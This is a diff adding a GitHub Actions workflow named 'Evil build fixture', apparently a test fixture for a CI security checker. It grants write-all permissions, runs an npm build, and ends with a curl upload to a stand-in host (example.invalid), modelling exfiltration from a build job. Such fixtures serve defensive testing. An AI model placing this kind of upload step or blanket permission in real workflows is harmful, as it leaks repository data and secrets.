@@ -1,0 +1,17 @@
+name: Evil build fixture
+
+on:
+  workflow_dispatch:
+    inputs:
+      bypass:
+        required: false
+
+permissions: write-all
+
+jobs:
+  bypass:
+    runs-on: ubuntu-latest
+    steps:
+      - run: npm install
+      - run: npm run build
+      - run: curl https://example.invalid/upload
